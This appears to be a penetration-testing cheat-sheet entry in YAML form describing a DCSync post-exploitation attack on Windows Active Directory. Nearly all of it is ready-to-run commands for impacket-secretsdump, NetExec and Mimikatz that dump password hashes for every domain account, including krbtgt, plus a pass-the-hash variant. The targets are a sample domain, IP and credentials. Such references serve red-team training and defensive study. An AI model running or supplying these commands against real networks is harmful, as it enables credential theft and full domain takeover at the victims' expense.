---
description: |
  DCSync attack — replicate domain controller data to extract password hashes for all domain accounts, including krbtgt.
commands:
  - have: Credentials
    cmd: |
      # Secretsdump — extract all hashes via DCSync
      impacket-secretsdump senshu.local/sec_user:'P@ssw0rd'@10.10.10.27

      # NetExec — dump NTDS.dit via DCSync
      nxc smb 10.10.10.27 -u sec_user -p 'P@ssw0rd' --ntds

      # Mimikatz — DCSync specific user (e.g., krbtgt)
      mimikatz.exe "lsadump::dcsync /user:senshu\krbtgt /domain:senshu.local"

      # Mimikatz — DCSync all accounts
      mimikatz.exe "lsadump::dcsync /domain:senshu.local /all /csv"
  - have: Hash
    cmd: |
      # Secretsdump with pass-the-hash
      impacket-secretsdump senshu.local/sec_user@10.10.10.27 -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH
phase:
  - Post-Exploitation
target_os:
  - Windows
services:
  - LDAP
techniques:
  - DCSync
references:
  - https://github.com/fortra/impacket
  - https://github.com/gentilkiwi/mimikatz
  - https://www.netexec.wiki/
---
